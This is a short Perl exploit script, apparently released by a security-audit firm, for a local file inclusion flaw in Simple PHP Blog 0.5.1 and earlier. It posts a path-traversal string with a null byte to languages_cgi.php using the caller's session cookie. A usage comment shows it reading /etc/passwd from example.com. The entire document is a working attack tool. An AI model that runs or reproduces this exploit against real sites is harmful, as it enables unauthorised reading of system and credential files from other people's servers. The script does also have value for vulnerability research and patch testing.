#!/usr/bin/perl
# Local File Include Exploit
# Simple PHP Blog <= 0.5.1
# jgaliana <at> isecauditors=dot=com
# Internet Security Auditors

use LWP::UserAgent;

if ($#ARGV < 3) { die("Usage: $0 <site> <path> <file> <cookie>"); }
$ua = LWP::UserAgent->new;
$ua->agent("Simple PHP Blog Exploit ^_^");
$ua->default_header('Cookie' => "sid=$ARGV[3]");
my $req = new HTTP::Request POST =>
"http://$ARGV[0]$ARGV[1]/languages_cgi.php";
$req->content_type('application/x-www-form-urlencoded');
$req->content("blog_language1=../../../../..$ARGV[2]%00");
my $res = $ua->request($req);

if ($res->is_success) {
    print $res->content;
} else {
    print "Error: " .$res->status_line, "\n";
}

#$ perl simple.pl example.com /blog /etc/passwd <my_cookie_here>|head -1
#root:*:0:0:root:/root:/bin/bash
